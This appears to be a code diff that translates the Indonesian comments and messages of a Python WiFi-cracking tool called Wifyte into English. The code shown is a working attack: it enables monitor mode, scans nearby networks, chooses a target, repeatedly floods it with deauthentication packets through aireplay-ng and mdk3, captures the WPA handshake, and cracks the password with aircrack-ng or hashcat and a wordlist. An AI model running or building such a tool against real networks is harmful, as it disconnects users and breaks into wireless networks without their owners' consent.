@@ -13,7 +13,7 @@ import tempfile
 import threading
 
 
-# Warna untuk output
+# Color for output
 class Colors:
     HEADER = "\033[95m"
     BLUE = "\033[94m"
@@ -48,30 +48,28 @@ class Wifyte:
         self.stop_capture = False
         self.handshake_found = False
 
-        # Membuat direktori handshakes jika belum ada
+        # Create a handshakes directory if it does not already exist
         if not os.path.exists(self.handshake_dir):
             os.makedirs(self.handshake_dir)
 
         self.wordlist_path = os.path.join(os.getcwd(), "wifyte.txt")
 
-        # Cek apakah wordlist ada
+        # Check if the wordlist exists
         if not os.path.exists(self.wordlist_path):
             print(
-                f"{Colors.YELLOW}[!] Wordlist tidak ditemukan di {self.wordlist_path}{Colors.ENDC}"
+                f"{Colors.YELLOW}[!] Wordlist not found in {self.wordlist_path}{Colors.ENDC}"
             )
-            print(f"{Colors.YELLOW}[!] Membuat wordlist default...{Colors.ENDC}")
+            print(f"{Colors.YELLOW}[!] Create a default wordlist...{Colors.ENDC}")
             with open(self.wordlist_path, "w") as f:
                 f.write("password\n12345678\nqwerty123\nadmin123\nwifi12345\n")
-            print(f"{Colors.GREEN}[+] Wordlist default dibuat{Colors.ENDC}")
+            print(f"{Colors.GREEN}[+] Default wordlist created.{Colors.ENDC}")
 
     def cleanup(self):
-        """Membersihkan file temporary"""
+        """Clearing temporary files"""
         try:
             shutil.rmtree(self.temp_dir)
         except Exception as e:
-            print(
-                f"{Colors.RED}[!] Error saat membersihkan direktori temp: {e}{Colors.ENDC}"
-            )
+            print(f"{Colors.RED}[!] Error clearing temp directory: {e}{Colors.ENDC}")
 
     def __del__(self):
         self.cleanup()
@@ -79,23 +77,23 @@ class Wifyte:
     def execute_command(
         self, command, shell=False, capture_output=True, text=True
     ) -> subprocess.CompletedProcess:
-        """Menjalankan shell command dengan error handling"""
+        """Running shell commands with error handling"""
         try:
             result = subprocess.run(
                 command, shell=shell, capture_output=capture_output, text=text
             )
             return result
         except Exception as e:
-            print(f"{Colors.RED}[!] Error saat menjalankan command: {e}{Colors.ENDC}")
+            print(f"{Colors.RED}[!] Error when executing command: {e}{Colors.ENDC}")
             print(f"{Colors.RED}[!] Command: {command}{Colors.ENDC}")
             return None
 
     def find_wifi_interfaces(self) -> List[str]:
-        """Menemukan semua interface wifi yang tersedia"""
+        """Find all available wifi interfaces"""
         result = self.execute_command(["iwconfig"], shell=True)
         if not result or result.returncode != 0:
             print(
-                f"{Colors.RED}[!] Error: Gagal mendapatkan daftar interface wifi{Colors.ENDC}"
+                f"{Colors.RED}[!] Error: Failed to get wifi interface list{Colors.ENDC}"
             )
             sys.exit(1)
 
@@ -108,7 +106,7 @@ class Wifyte:
         return interfaces
 
     def check_monitor_mode(self, interface) -> bool:
-        """Memeriksa apakah interface dalam mode monitor"""
+        """Check if the interface is in monitor mode"""
         result = self.execute_command(["iwconfig", interface])
         if not result or result.returncode != 0:
             return False
@@ -116,22 +114,22 @@ class Wifyte:
         return "Mode:Monitor" in result.stdout
 
     def enable_monitor_mode(self, interface) -> Optional[str]:
-        """Mengaktifkan mode monitor pada interface"""
-        # Matikan proses yang mungkin mengganggu
+        """Enable monitor mode on the interface"""
+        # Turn off processes that may be interfering
         self.execute_command(["airmon-ng", "check", "kill"])
 
-        # Matikan interface
+        # Turn off the interface
         self.execute_command(["ifconfig", interface, "down"])
 
-        # Ubah ke mode monitor
+        # Change to mode monitor
         result = self.execute_command(["airmon-ng", "start", interface])
         if not result or result.returncode != 0:
             print(
-                f"{Colors.RED}[!] Error: Gagal mengaktifkan mode monitor pada {interface}{Colors.ENDC}"
+                f"{Colors.RED}[!] Error: Failed to enable monitor mode on {interface}{Colors.ENDC}"
             )
             return None
 
-        # Cari nama interface monitor yang dibuat
+        # Search for the name of the created monitor interface
         match = re.search(
             r"(Created monitor mode interface|monitor mode enabled on) (\w+)",
             result.stdout,
@@ -139,91 +137,83 @@ class Wifyte:
         if match:
             monitor_interface = match.group(2)
         else:
-            # Cara alternatif jika format output berbeda
+            # Alternative way if the output format is different
             interfaces_after = self.find_wifi_interfaces()
             for iface in interfaces_after:
                 if self.check_monitor_mode(iface):
                     monitor_interface = iface
                     break
             else:
-                monitor_interface = f"{interface}mon"  # Asumsi default airmon-ng
+                monitor_interface = f"{interface}mon"  # Default airmon-ng assumptions
 
-        # Memastikan interface up
+        # Ensuring the interface is up
         self.execute_command(["ifconfig", monitor_interface, "up"])
 
         print(
-            f"{Colors.GREEN}[+] Mode monitor aktif pada interface {monitor_interface}{Colors.ENDC}"
+            f"{Colors.GREEN}[+] Monitor mode is active on the interface {monitor_interface}{Colors.ENDC}"
         )
         return monitor_interface
 
     def disable_monitor_mode(self, monitor_interface) -> bool:
-        """Menonaktifkan mode monitor"""
+        """Disable monitor mode"""
         result = self.execute_command(["airmon-ng", "stop", monitor_interface])
         if not result or result.returncode != 0:
-            print(
-                f"{Colors.RED}[!] Error: Gagal menonaktifkan mode monitor{Colors.ENDC}"
-            )
+            print(f"{Colors.RED}[!] Error: Failed to disable monitor mode{Colors.ENDC}")
             return False
 
-        # Restart NetworkManager untuk mengembalikan koneksi normal
+        # Restart NetworkManager to restore normal connection
         self.execute_command(
             ["service", "NetworkManager", "restart"], capture_output=False
         )
 
         print(
-            f"{Colors.GREEN}[+] Mode monitor dinonaktifkan dan NetworkManager direstart{Colors.ENDC}"
+            f"{Colors.GREEN}[+] Monitor mode disabled and NetworkManager restarted{Colors.ENDC}"
         )
         return True
 
     def setup_interface(self):
-        """Menyiapkan interface wifi untuk scanning"""
-        print(f"{Colors.BLUE}[*] Mencari interface wifi...{Colors.ENDC}")
+        """Setting up a wifi interface for scanning"""
+        print(f"{Colors.BLUE}[*] Searching for wifi interfaces...{Colors.ENDC}")
         interfaces = self.find_wifi_interfaces()
 
         if not interfaces:
-            print(
-                f"{Colors.RED}[!] Error: Tidak ada interface wifi ditemukan{Colors.ENDC}"
-            )
+            print(f"{Colors.RED}[!] Error: No wifi interface found{Colors.ENDC}")
             sys.exit(1)
 
-        # Cek apakah ada interface yang sudah dalam mode monitor
+        # Check if any interfaces are already in monitor mode
         for interface in interfaces:
             if self.check_monitor_mode(interface):
                 print(
-                    f"{Colors.GREEN}[+] Interface {interface} sudah dalam mode monitor{Colors.ENDC}"
+                    f"{Colors.GREEN}[+] Interface {interface} already in monitor mode{Colors.ENDC}"
                 )
                 self.monitor_interface = interface
                 return
 
-        # Jika tidak ada yang dalam mode monitor, pilih interface pertama
+        # If none are in monitor mode, select the first interface
         self.interface = interfaces[0]
-        print(f"{Colors.GREEN}[+] Menggunakan interface {self.interface}{Colors.ENDC}")
+        print(f"{Colors.GREEN}[+] Using interface {self.interface}{Colors.ENDC}")
 
-        # Aktifkan mode monitor
+        # Enable monitor mode
         self.monitor_interface = self.enable_monitor_mode(self.interface)
         if not self.monitor_interface:
-            print(
-                f"{Colors.RED}[!] Error: Gagal mengaktifkan mode monitor{Colors.ENDC}"
-            )
+            print(f"{Colors.RED}[!] Error: Failed to enable monitor mode{Colors.ENDC}")
             sys.exit(1)
 
     def scan_networks(self) -> List[WiFiNetwork]:
-        """Melakukan scanning jaringan wifi yang tersedia"""
+        """Scanning available wifi networks"""
         if not self.monitor_interface:
             print(
-                f"{Colors.RED}[!] Error: Tidak ada interface monitor mode{Colors.ENDC}"
+                f"{Colors.RED}[!] Error: No monitor mode interface found{Colors.ENDC}"
             )
             return []
 
-        print(f"{Colors.BLUE}[*] Memulai scanning jaringan WiFi...{Colors.ENDC}")
-        print(
-            f"{Colors.YELLOW}[!] Tekan Ctrl+C untuk menghentikan scanning{Colors.ENDC}"
-        )
+        print(f"{Colors.BLUE}[*] Starting WiFi network scan...{Colors.ENDC}")
+        print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop scanning{Colors.ENDC}")
 
-        # File untuk menyimpan hasil scanning
+        # File to save scan results
         output_file = os.path.join(self.temp_dir, "scan-01.csv")
 
-        # Jalankan airodump-ng untuk scanning
+        # Run airodump-ng for scanning
         proc = subprocess.Popen(
             [
                 "airodump-ng",
@@ -238,26 +228,26 @@ class Wifyte:
         )
 
         try:
-            # Scan selama 6 detik (lebih cepat dari sebelumnya)
+            # Scan for 6 seconds (faster than before)
             for i in range(6):
                 time.sleep(1)
                 print(f"{Colors.BLUE}[*] Scanning... {i+1}/6{Colors.ENDC}", end="\r")
             print("\n")
         except KeyboardInterrupt:
-            print(f"\n{Colors.YELLOW}[!] Scanning dihentikan oleh user{Colors.ENDC}")
+            print(f"\n{Colors.YELLOW}[!] Scanning stopped by user{Colors.ENDC}")
         finally:
             proc.send_signal(signal.SIGTERM)
             proc.wait()
 
         networks = []
 
-        # Parse hasil scanning dari file CSV
+        # Parse scan results from CSV file
         try:
             if os.path.exists(output_file):
                 with open(output_file, "r", encoding="utf-8", errors="replace") as f:
                     lines = f.readlines()
 
-                # Lewati header
+                # Skip header
                 data_section = False
                 network_id = 0
 
@@ -289,7 +279,7 @@ class Wifyte:
                             encryption = parts[5].strip() + " " + parts[6].strip()
                             essid = parts[13].strip().replace("\x00", "")
 
-                            if essid:  # Hanya tambahkan jaringan dengan ESSID
+                            if essid:  # Only add networks with ESSID
                                 networks.append(
                                     WiFiNetwork(
                                         id=network_id,
@@ -302,38 +292,36 @@ class Wifyte:
                                 )
             else:
                 print(
-                    f"{Colors.RED}[!] Error: File hasil scanning tidak ditemukan{Colors.ENDC}"
+                    f"{Colors.RED}[!] Error: Scan results file not found{Colors.ENDC}"
                 )
         except Exception as e:
-            print(
-                f"{Colors.RED}[!] Error saat membaca hasil scanning: {e}{Colors.ENDC}"
-            )
+            print(f"{Colors.RED}[!] Error reading scan results: {e}{Colors.ENDC}")
 
         return networks
 
     def deauth_clients(self, network: WiFiNetwork) -> bool:
-        """Melakukan deauth pada semua client di jaringan target dengan metode yang lebih efektif"""
+        """Deauth all clients on the target network using a more effective method"""
         if not self.monitor_interface:
             print(
-                f"{Colors.RED}[!] Error: Tidak ada interface monitor mode{Colors.ENDC}"
+                f"{Colors.RED}[!] Error: No monitor mode interface found{Colors.ENDC}"
             )
             return False
 
         print(
-            f"{Colors.BLUE}[*] Melakukan deauth agresif pada {network.essid} ({network.bssid})...{Colors.ENDC}"
+            f"{Colors.BLUE}[*] Performing aggressive deauth on {network.essid} ({network.bssid})...{Colors.ENDC}"
         )
 
-        # Metode 1: Deauth broadcast (semua client)
+        # Method 1: Deauth broadcast (all client)
         deauth_cmd1 = [
             "aireplay-ng",
             "--deauth",
-            "120",  # Lebih banyak paket deauth
+            "120",  # more deauth packets
             "-a",
             network.bssid,
             self.monitor_interface,
         ]
 
-        # Jalankan deauth dalam thread terpisah untuk tidak memblokir program
+        # Run deauth in a separate thread to avoid blocking the program
         def run_deauth():
             self.execute_command(deauth_cmd1, capture_output=False)
 
@@ -341,23 +329,23 @@ class Wifyte:
         deauth_thread.daemon = True
         deauth_thread.start()
 
-        # Berikan waktu singkat untuk memastikan paket deauth terkirim
+        # Give a short time to ensure deauth packets are sent
         time.sleep(1)
 
-        print(f"{Colors.GREEN}[+] Deauth packets berhasil dikirim{Colors.ENDC}")
+        print(f"{Colors.GREEN}[+] Deauth packets successfully sent{Colors.ENDC}")
         return True
 
     def check_for_handshake(self, cap_file: str) -> bool:
-        """Memeriksa file capture untuk handshake"""
+        """Check the capture file for handshake"""
         if not os.path.exists(cap_file):
             return False
 
-        # Metode 1: Menggunakan aircrack-ng
+        # Method 1: Using aircrack-ng
         aircrack_result = self.execute_command(["aircrack-ng", cap_file])
         if aircrack_result and "1 handshake" in aircrack_result.stdout:
             return True
 
-        # Metode 2: Menggunakan cowpatty (jika tersedia) - verifikasi lebih akurat
+        # Method 2: Using cowpatty (if available) - more accurate verification
         cowpatty_path = shutil.which("cowpatty")
         if cowpatty_path:
             cowpatty_result = self.execute_command(["cowpatty", "-c", "-r", cap_file])
@@ -368,7 +356,7 @@ class Wifyte:
             ):
                 return True
 
-        # Metode 3: Menggunakan pyrit (jika tersedia) - verifikasi lebih akurat lagi
+        # Method 3: Using pyrit (if available) - more accurate verification
         pyrit_path = shutil.which("pyrit")
         if pyrit_path:
             pyrit_result = self.execute_command(["pyrit", "-r", cap_file, "analyze"])
@@ -382,40 +370,40 @@ class Wifyte:
         return False
 
     def handshake_watcher(self, capture_path: str, network: WiFiNetwork):
-        """Thread untuk memantau file capture dan mengecek handshake"""
+        """Thread to monitor the capture file and check for handshake"""
         cap_file = f"{capture_path}-01.cap"
-        check_interval = 1  # Cek setiap 1 detik
+        check_interval = 1  # Check every 1 second
 
         while not self.stop_capture:
             if os.path.exists(cap_file) and self.check_for_handshake(cap_file):
-                print(f"{Colors.GREEN}[+] Handshake terdeteksi!{Colors.ENDC}")
+                print(f"{Colors.GREEN}[+] Handshake detected!{Colors.ENDC}")
                 self.handshake_found = True
                 self.stop_capture = True
                 break
             time.sleep(check_interval)
 
     def capture_handshake(self, network: WiFiNetwork) -> Optional[str]:
-        """Menangkap handshake dari jaringan target dengan metode yang ditingkatkan"""
+        """Capture handshake from the target network using an enhanced method"""
         if not self.monitor_interface:
             print(
                 f"{Colors.RED}[!] Error: Tidak ada interface monitor mode{Colors.ENDC}"
             )
             return None
 
-        # Nama file untuk handshake
+        # File name for handshake
         timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
         capture_name = f"{network.essid.replace(' ', '_')}_{timestamp}"
         capture_path = os.path.join(self.temp_dir, capture_name)
 
         print(
-            f"{Colors.BLUE}[*] Memulai capture handshake untuk {network.essid}...{Colors.ENDC}"
+            f"{Colors.BLUE}[*] Starting handshake capture for {network.essid}...{Colors.ENDC}"
         )
 
         # Reset flag
         self.stop_capture = False
         self.handshake_found = False
 
-        # Jalankan airodump-ng untuk capture handshake
+        # Run airodump-ng for capture handshake
         capture_cmd = [
             "airodump-ng",
             "--bssid",
@@ -431,15 +419,15 @@ class Wifyte:
             capture_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
         )
 
-        # Mulai thread watcher untuk memeriksa handshake
+        # Start thread watcher for checking handshake
         watcher_thread = threading.Thread(
             target=self.handshake_watcher, args=(capture_path, network)
         )
         watcher_thread.daemon = True
         watcher_thread.start()
 
-        # Strategi deauth yang lebih agresif
-        max_attempts = 12  # Lebih banyak percobaan
+        # More aggressive deauth strategy
+        max_attempts = 12  # More attempts
         attempt = 0
 
         try:
@@ -449,9 +437,9 @@ class Wifyte:
                     f"{Colors.BLUE}[*] Deauth attempt {attempt}/{max_attempts}...{Colors.ENDC}"
                 )
 
-                # Kirim deauth packet dengan pendekatan berbeda di setiap percobaan
+                # Send deauth packets with different approaches in each attempt
                 if attempt % 2 == 0:
-                    # Pendekatan 1: Deauth broadcast
+                    # Approach 1: Deauth broadcast
                     subprocess.Popen(
                         [
                             "aireplay-ng",
@@ -465,7 +453,7 @@ class Wifyte:
                         stderr=subprocess.DEVNULL,
                     )
                 else:
-                    # Pendekatan 2: MDK3 deauth (jika tersedia)
+                    # Approach 2: MDK3 deauth (if available)
                     mdk3_path = shutil.which("mdk3")
                     if mdk3_path:
                         subprocess.Popen(
@@ -474,7 +462,7 @@ class Wifyte:
                             stderr=subprocess.DEVNULL,
                         )
                     else:
-                        # Pendekatan fallback: aireplay dengan lebih banyak paket
+                        # Fallback approach: aireplay with more packets
                         subprocess.Popen(
                             [
                                 "aireplay-ng",
@@ -488,24 +476,24 @@ class Wifyte:
                             stderr=subprocess.DEVNULL,
                         )
 
-                # Tunggu sebentar antara deauth attempts (lebih pendek dari sebelumnya)
+                # Wait a moment between deauth attempts (shorter than before)
                 for i in range(3):
                     if self.handshake_found:
                         break
                     time.sleep(1)
 
-            # Final check jika tidak terdeteksi oleh watcher
+            # Final check if not detected by the watcher
             cap_file = f"{capture_path}-01.cap"
             if not self.handshake_found and os.path.exists(cap_file):
                 self.handshake_found = self.check_for_handshake(cap_file)
 
             if not self.handshake_found:
                 print(
-                    f"{Colors.RED}[!] Gagal menangkap handshake setelah {max_attempts} percobaan{Colors.ENDC}"
+                    f"{Colors.RED}[!] Failed to capture handshake after {max_attempts} attempts{Colors.ENDC}"
                 )
                 return None
 
-            # Salin handshake ke direktori handshakes
+            # Copy handshake to handshakes directory
             final_path = os.path.join(
                 self.handshake_dir, f"{network.essid.replace(' ', '_')}.cap"
             )
@@ -515,7 +503,7 @@ class Wifyte:
             return final_path
 
         except KeyboardInterrupt:
-            print(f"\n{Colors.YELLOW}[!] Capture dibatalkan oleh user{Colors.ENDC}")
+            print(f"\n{Colors.YELLOW}[!] Capture cancelled by user{Colors.ENDC}")
             return None
         finally:
             self.stop_capture = True
@@ -523,23 +511,23 @@ class Wifyte:
             capture_proc.wait()
 
     def verify_handshake(self, handshake_path: str) -> bool:
-        """Verifikasi apakah handshake valid dengan beberapa metode"""
+        """Verify if the handshake is valid using multiple methods"""
         if not os.path.exists(handshake_path):
-            print(f"{Colors.RED}[!] Error: File handshake tidak ditemukan{Colors.ENDC}")
+            print(f"{Colors.RED}[!] Error: Handshake file not found{Colors.ENDC}")
             return False
 
         print(
-            f"{Colors.BLUE}[*] Memverifikasi handshake dengan multiple tools...{Colors.ENDC}"
+            f"{Colors.BLUE}[*] Verifying handshake with multiple tools...{Colors.ENDC}"
         )
 
-        # Metode 1: Aircrack-ng
+        # Method 1: Aircrack-ng
         aircrack_valid = False
         result = self.execute_command(["aircrack-ng", handshake_path])
         if result and "1 handshake" in result.stdout:
             aircrack_valid = True
             print(f"{Colors.GREEN}[+] Aircrack-ng: Handshake valid{Colors.ENDC}")
 
-        # Metode 2: Cowpatty (jika tersedia)
+        # Method 2: Cowpatty (if available)
         cowpatty_valid = False
         cowpatty_path = shutil.which("cowpatty")
         if cowpatty_path:
@@ -556,30 +544,26 @@ class Wifyte:
         is_valid = aircrack_valid or cowpatty_valid
 
         if is_valid:
-            print(f"{Colors.GREEN}[+] Handshake terverifikasi dan valid!{Colors.ENDC}")
+            print(f"{Colors.GREEN}[+] Handshake verified and valid!{Colors.ENDC}")
         else:
-            print(
-                f"{Colors.RED}[!] Handshake tidak valid atau tidak lengkap{Colors.ENDC}"
-            )
+            print(f"{Colors.RED}[!] Handshake is not valid or incomplete{Colors.ENDC}")
 
         return is_valid
 
     def crack_password(self, handshake_path: str) -> Optional[str]:
-        """Melakukan cracking password dengan wordlist menggunakan metode optimal"""
+        """Perform password cracking with wordlist using optimal method"""
         if not os.path.exists(handshake_path):
-            print(f"{Colors.RED}[!] Error: File handshake tidak ditemukan{Colors.ENDC}")
+            print(f"{Colors.RED}[!] Error: Handshake file not found{Colors.ENDC}")
             return None
 
         if not os.path.exists(self.wordlist_path):
-            print(f"{Colors.RED}[!] Error: Wordlist tidak ditemukan{Colors.ENDC}")
+            print(f"{Colors.RED}[!] Error: Wordlist not found{Colors.ENDC}")
             return None
 
-        print(f"{Colors.BLUE}[*] Memulai cracking password...{Colors.ENDC}")
-        print(
-            f"{Colors.BLUE}[*] Menggunakan wordlist: {self.wordlist_path}{Colors.ENDC}"
-        )
+        print(f"{Colors.BLUE}[*] Starting password cracking...{Colors.ENDC}")
+        print(f"{Colors.BLUE}[*] Using wordlist: {self.wordlist_path}{Colors.ENDC}")
 
-        # Ekstrak ESSID dari nama file
+        # Extract ESSID from the file name
         essid = os.path.basename(handshake_path).split(".")[0].replace("_", " ")
 
         # Metode 1: Hashcat (jika tersedia - lebih cepat)
@@ -669,13 +653,13 @@ class Wifyte:
         self.networks = self.scan_networks()
 
         if not self.networks:
-            print(f"{Colors.RED}[!] Tidak ada jaringan yang ditemukan.{Colors.ENDC}")
+            print(f"{Colors.RED}[!] No networks found.{Colors.ENDC}")
             self.exit_program()
             return
 
         # Tampilkan hasil scan
         print(
-            f"\n{Colors.BLUE}===== {len(self.networks)} Jaringan Ditemukan ====={Colors.ENDC}"
+            f"\n{Colors.BLUE}===== {len(self.networks)} Networks found ====={Colors.ENDC}"
         )
         for network in self.networks:
             print(network)
@@ -684,31 +668,31 @@ class Wifyte:
         try:
             network_choice = int(
                 input(
-                    f"\n{Colors.YELLOW}[?] Pilih jaringan target [1-{len(self.networks)}]: {Colors.ENDC}"
+                    f"\n{Colors.YELLOW}[?] Select Target [1-{len(self.networks)}]: {Colors.ENDC}"
                 )
             )
             if network_choice < 1 or network_choice > len(self.networks):
-                print(f"{Colors.RED}[!] Pilihan tidak valid{Colors.ENDC}")
+                print(f"{Colors.RED}[!] Invalid choice{Colors.ENDC}")
                 self.exit_program()
                 return
         except ValueError:
-            print(f"{Colors.RED}[!] Input tidak valid{Colors.ENDC}")
+            print(f"{Colors.RED}[!] Invalid input{Colors.ENDC}")
             self.exit_program()
             return
         except KeyboardInterrupt:
-            print(f"\n{Colors.YELLOW}[!] Program dibatalkan oleh user{Colors.ENDC}")
+            print(f"\n{Colors.YELLOW}[!] Program cancelled by user{Colors.ENDC}")
             self.exit_program()
             return
 
         target_network = self.networks[network_choice - 1]
         print(
-            f"\n{Colors.GREEN}[+] Target dipilih: {target_network.essid} ({target_network.bssid}){Colors.ENDC}"
+            f"\n{Colors.GREEN}[+] Selected target: {target_network.essid} ({target_network.bssid}){Colors.ENDC}"
         )
 
         # Capture handshake
         handshake_path = self.capture_handshake(target_network)
         if not handshake_path:
-            print(f"{Colors.RED}[!] Gagal menangkap handshake{Colors.ENDC}")
+            print(f"{Colors.RED}[!] Failed capturing handshake{Colors.ENDC}")
             self.exit_program()
             return
 
@@ -728,7 +712,7 @@ class Wifyte:
         try:
             disable_monitor = (
                 input(
-                    f"\n{Colors.YELLOW}[?] Matikan monitor mode? (y/n): {Colors.ENDC}"
+                    f"\n{Colors.YELLOW}[?] Disable monitor mode? (y/n): {Colors.ENDC}"
                 ).lower()
                 == "y"
             )
@@ -737,15 +721,15 @@ class Wifyte:
                 self.disable_monitor_mode(self.monitor_interface)
             else:
                 print(
-                    f"{Colors.GREEN}[+] Monitor mode tetap aktif pada {self.monitor_interface}{Colors.ENDC}"
+                    f"{Colors.GREEN}[+] Monitor mode remains active on {self.monitor_interface}{Colors.ENDC}"
                 )
 
-            print(f"{Colors.BLUE}[*] Program selesai. Terima kasih!{Colors.ENDC}")
+            print(f"{Colors.BLUE}[*] Program closed, thank you!{Colors.ENDC}")
         except KeyboardInterrupt:
-            print(f"\n{Colors.YELLOW}[!] Program dibatalkan oleh user{Colors.ENDC}")
+            print(f"\n{Colors.YELLOW}[!] Program cancelled by user{Colors.ENDC}")
             if self.monitor_interface:
                 print(
-                    f"{Colors.GREEN}[+] Monitor mode tetap aktif pada {self.monitor_interface}{Colors.ENDC}"
+                    f"{Colors.GREEN}[+] Monitor mode remains active on {self.monitor_interface}{Colors.ENDC}"
                 )
 
 
@@ -754,7 +738,7 @@ if __name__ == "__main__":
         # Cek apakah dijalankan sebagai root
         if os.geteuid() != 0:
             print(
-                f"{Colors.RED}[!] Error: Program ini memerlukan akses root. Jalankan dengan 'sudo'{Colors.ENDC}"
+                f"{Colors.RED}[!] Error: This program requires root access. Please run with 'sudo'{Colors.ENDC}"
             )
             sys.exit(1)
 
@@ -768,10 +752,10 @@ if __name__ == "__main__":
 
         if missing_deps:
             print(
-                f"{Colors.RED}[!] Error: Beberapa dependensi tidak ditemukan: {', '.join(missing_deps)}{Colors.ENDC}"
+                f"{Colors.RED}[!] Error: Some dependencies are missing: {', '.join(missing_deps)}{Colors.ENDC}"
             )
             print(
-                f"{Colors.YELLOW}[!] Silakan install aircrack-ng suite terlebih dahulu:{Colors.ENDC}"
+                f"{Colors.YELLOW}[!] Please install the aircrack-ng suite first:{Colors.ENDC}"
             )
             print(f"{Colors.YELLOW}    sudo apt-get install aircrack-ng{Colors.ENDC}")
             sys.exit(1)
@@ -779,6 +763,6 @@ if __name__ == "__main__":
         wifyte = Wifyte()
         wifyte.run()
     except KeyboardInterrupt:
-        print(f"\n{Colors.YELLOW}[!] Program dibatalkan oleh user{Colors.ENDC}")
+        print(f"\n{Colors.YELLOW}[!] Program cancelled by user{Colors.ENDC}")
     except Exception as e:
-        print(f"{Colors.RED}[!] Error tidak terduga: {e}{Colors.ENDC}")
+        print(f"{Colors.RED}[!] Unexpected error: {e}{Colors.ENDC}")
